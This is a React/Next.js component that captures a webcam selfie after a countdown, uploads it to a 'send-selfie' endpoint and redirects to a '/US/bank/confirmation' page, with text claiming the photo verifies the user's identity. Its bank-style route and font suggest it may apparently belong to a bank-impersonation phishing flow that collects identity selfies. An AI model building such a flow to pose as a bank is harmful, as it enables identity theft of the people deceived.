import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogOverlay,
  Image,
  Box,
  Text,
} from "@chakra-ui/react";
import axios from "axios";
import { useRouter } from "next/router";
import React, { useCallback, useContext, useRef, useState } from "react";
import Webcam from "react-webcam";
import { DataContext } from "../pages/_app";
import { dataURItoBlob } from "../utils/dataURItoBlob";
import { Button } from "./Button";
import { IntroText } from "./IntroText";
import { Container } from "./Container";
import { Section } from "./Section";
import { AltButton } from "./AltButton";

interface SelfieModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const SelfieModal: React.FC<SelfieModalProps> = ({
  isOpen,
  onClose,
}) => {
  const { data: datas, setData } = useContext(DataContext);

  const { push } = useRouter();

  const [imageSrc, setImageSrc] = useState(``);
  const [timer, setTimer] = useState(4);
  const [loading, setLoading] = useState(false);
  const webcamRef = useRef(null) as any;

  const capture = useCallback(() => {
    const interval = setInterval(() => {
      setTimer((prevTimer) => {
        if (prevTimer === 1) {
          setImageSrc(
            webcamRef.current ? webcamRef.current.getScreenshot() : ``
          );
          setTimer(4);
          clearInterval(interval);
        }
        return prevTimer - 1;
      });
    }, 1000);
  }, []);

  const onSubmit = async () => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`selfie`, dataURItoBlob(imageSrc));
    formData.append(`form`, `SELFIE`);

    await axios.post(`/api/send-selfie`, formData, {
      headers: {
        "Content-Type": `multipart/form-data`,
      },
    });
    setLoading(false);
    setData({
      ...datas,
      selfie: imageSrc,
    });
    push(`/US/bank/confirmation`);
  };
  const cancelRef = React.useRef() as React.RefObject<any> | undefined;
  return (
    <AlertDialog
      isOpen={isOpen}
      onClose={onClose}
      leastDestructiveRef={cancelRef}
      isCentered
      size={`full`}
      motionPreset={`slideInBottom`}
    >
      <AlertDialogOverlay>
        <AlertDialogContent
          p={[`20px`, `50px`]}
          pos={`relative`}
          zIndex={11000}
          alignItems={`center`}
          justifyContent={`center`}
        >
          <Container>
            <Section>
              <IntroText
                title={`Take a selfie`}
                paragraph={`We will compare your selfie with the picture on your ID. We need this to verify your identity.`}
              />
              <Box>
                <Box w={[`100%`, `400px`]}>
                  <Box
                    display={`flex`}
                    justifyContent={`center`}
                    alignItems={`center`}
                    flexDirection={`row`}
                    height={`100%`}
                    width={`100%`}
                    className={`selfie_wrapper`}
                  >
                    {imageSrc ? (
                      <Image alt="selfie" src={imageSrc} />
                    ) : (
                      <Webcam
                        audio={false}
                        height={`100%`}
                        ref={webcamRef}
                        screenshotFormat="image/jpeg"
                        width={`100%`}
                        videoConstraints={{
                          facingMode: `user`,
                        }}
                      />
                    )}
                  </Box>
                </Box>
                <Box w={[`100%`, `33.3%`]}>
                  <Text
                    fontSize={`11px`}
                    fontFamily={`Interstate_Bold,sans-serif`}
                    mt={`20px`}
                    mb={`10px`}
                  >
                    Please make sure both ears and your all face is showing in
                    the picture. This will help ensure we can verify your
                    identity as quickly and accurately as possible.
                  </Text>
                  <>
                    {timer < 4 && !imageSrc ? (
                      <Box
                        display={`flex`}
                        alignItems={`center`}
                        justifyContent={`center`}
                        w={`full`}
                      >
                        <Box
                          display={`flex`}
                          width={`50px`}
                          height={`50px`}
                          borderRadius={`100%`}
                          border={`1px solid #666`}
                          fontWeight={`bold`}
                          fontSize={`24px`}
                          alignItems={`center`}
                          justifyContent={`center`}
                          color={`#666`}
                        >
                          {timer}
                        </Box>
                      </Box>
                    ) : (
                      <>
                        {imageSrc ? (
                          <Box
                            display={`flex`}
                            flexDirection={`column`}
                            width={`100%`}
                            justifyContent={`center`}
                          >
                            <Button
                              text={`Continue Verification`}
                              disabled={loading}
                              onClick={onSubmit}
                            />
                            <AltButton
                              text={`Retake`}
                              onClick={() => setImageSrc(``)}
                              w={[`100%`, `fit-content`]}
                            />
                          </Box>
                        ) : (
                          <Button text={`Take selfie`} onClick={capture} />
                        )}
                      </>
                    )}
                  </>
                </Box>
              </Box>
            </Section>
          </Container>
        </AlertDialogContent>
      </AlertDialogOverlay>
    </AlertDialog>
  );
};
